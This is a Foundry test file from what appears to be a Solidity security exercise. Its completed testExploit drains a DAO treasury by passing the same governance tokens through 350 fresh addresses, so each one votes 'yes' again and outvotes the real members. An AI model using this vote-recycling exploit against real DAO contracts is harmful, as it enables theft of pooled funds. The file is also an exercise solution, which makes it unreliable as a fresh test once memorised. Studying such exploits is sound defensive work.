// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/16. DAO Attack-2/TheGridDAO.sol";
import "../../src/16. DAO Attack-2/TheGridTreasury.sol";

/**
 * @dev run: forge test --mc TestDAO2 -vvv
 */
contract TestDAO2 is Test {
    TheGridDAO public dao;
    TheGridTreasury public treasury;

    address deployer = makeAddr("deployer");
    address daoMember1 = makeAddr("daoMember1");
    address daoMember2 = makeAddr("daoMember2");
    address attacker = makeAddr("attacker");
    address user = makeAddr("user");

    // Governance tokens
    uint256 constant DEPLOYER_TOKENS = 1500 ether;
    uint256 constant MEMBER_TOKENS = 1000 ether;
    uint256 constant ATTACKER_TOKENS = 10 ether;

    // Initial treasury balance
    uint256 constant TREASURY_BALANCE = 1000 ether;

    // Proposals
    uint256 constant FIRST_PROPOSAL_AMOUNT = 0.1 ether;
    uint256 constant SECOND_PROPOSAL_AMOUNT = 1 ether;

    uint256 attackerInitialEthBalance;
    uint256 treasuryBalanceAfterFirstProposal;

    function setUp() public {
        vm.deal(deployer, TREASURY_BALANCE);

        // Deploy contracts as deployer
        vm.startPrank(deployer);
        dao = new TheGridDAO();
        treasury = new TheGridTreasury(address(dao));
        dao.setTreasury(address(treasury));

        // ETH to treasury
        (bool sent,) = address(treasury).call{value: TREASURY_BALANCE}("");
        require(sent, "Failed to fund the treasury");
        assertEq(address(treasury).balance, TREASURY_BALANCE);

        // Mint governance tokens
        dao.mint(deployer, DEPLOYER_TOKENS);
        dao.mint(daoMember1, MEMBER_TOKENS);
        dao.mint(daoMember2, MEMBER_TOKENS);
        dao.mint(attacker, ATTACKER_TOKENS);

        vm.stopPrank();
    }

    function testGovernance() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */
        // Random user cannot propose
        vm.prank(user);
        vm.expectRevert("You don't have voting power");
        dao.propose(user, TREASURY_BALANCE);

        // Legit proposals by deployer
        vm.startPrank(deployer);
        dao.propose(address(deployer), FIRST_PROPOSAL_AMOUNT);
        dao.propose(address(deployer), SECOND_PROPOSAL_AMOUNT);
        vm.stopPrank();

        // Random user cannot vote
        vm.prank(user);
        vm.expectRevert("You don't have voting power");
        dao.vote(1, false);

        // DAO members can vote
        // First proposal should go through (Yes - 2500, No - 1000)
        vm.prank(daoMember1);
        dao.vote(1, true);

        // Can't vote twice
        vm.prank(daoMember1);
        vm.expectRevert("Already voted on this proposal");
        dao.vote(1, true);

        vm.prank(daoMember2);
        dao.vote(1, false);

        // Second proposal should fail (Yes - 1500, No - 2000)
        vm.prank(daoMember1);
        dao.vote(2, false);

        vm.prank(daoMember2);
        dao.vote(2, false);

        // Can't process before voting period ends
        vm.prank(deployer);
        vm.expectRevert("Voting is not over");
        dao.execute(1);

        // Advance time 1 day so we can try proposal execution
        vm.warp(block.timestamp + 1 days);

        // First proposal should succeed - treasury pays deployer 0.1 ETH
        vm.prank(deployer);
        dao.execute(1);

        treasuryBalanceAfterFirstProposal = TREASURY_BALANCE - FIRST_PROPOSAL_AMOUNT;

        assertEq(address(treasury).balance, treasuryBalanceAfterFirstProposal);

        // Second proposal should fail - treasury balance unchanged
        vm.prank(deployer);
        dao.execute(2);

        assertEq(address(treasury).balance, treasuryBalanceAfterFirstProposal);

        // Both proposal should be marked as processed
        (,,,,,, bool processed) = dao.getProposal(1);
        assertTrue(processed);

        (,,,,,, processed) = dao.getProposal(2);
        assertTrue(processed);

        // Can't execute processed proposals again
        vm.prank(deployer);
        vm.expectRevert("Proposal already processed");
        dao.execute(2);
    }

    function testExploit() public {
        testGovernance();

        /**
         * YOUR EXPLOIT GOES HERE *
         */

        // Attacker creates a proposal to drain the treasury
        vm.deal(attacker, 20 ether);
        attackerInitialEthBalance = attacker.balance;

        vm.prank(attacker);
        uint256 proposalId = dao.propose(attacker, treasuryBalanceAfterFirstProposal);
        assertEq(proposalId, 3);

        // We need more than 3500 "yes" votes to pass the proposal
        // Attacker has 10 tokens, deployer + 2 members have 3500 tokens together
        // Attacker needs to create 300+ fake addresses to vote "yes"

        address currentSigner = attacker;
        address nextSigner;

        // Create 350 addresses to vote "yes" on the malicious proposal
        for (uint256 i = 0; i < 350; i++) {
            nextSigner = makeAddr(string(abi.encodePacked(i))); // Create a new address

            vm.prank(attacker);
            (bool success,) = nextSigner.call{value: 0.05 ether}(""); // Fund the address to pay gas
            require(success, "Failed to fund attacker signer");

            vm.prank(currentSigner);
            dao.transfer(nextSigner, ATTACKER_TOKENS); // Transfer attacker tokens to the new address

            vm.prank(nextSigner);
            dao.vote(3, true);

            currentSigner = nextSigner;
        }

        // Other DAO Members vote "no" on the malicious proposal
        vm.prank(deployer);
        dao.vote(3, false);

        vm.prank(daoMember1);
        dao.vote(3, false);

        vm.prank(daoMember2);
        dao.vote(3, false);

        // Advance time 1 day so we can try proposal execution
        vm.warp(block.timestamp + 1 days);

        // All votes are in - proposal should pass with (Yes - 3510, No - 3500)
        // Execute the proposal
        vm.prank(attacker);
        dao.execute(3);

        // Attacker should have drained the treasury Minus gas costs
        // attacker should have initial balance + treasury balance - (350 * 0.05)
        // - gas costs (approx 20 ether)
        assertGt(
            address(attacker).balance,
            attackerInitialEthBalance + treasuryBalanceAfterFirstProposal - 0.05 ether * 350 - 20 ether
        );
        assertEq(address(treasury).balance, 0);
    }
}
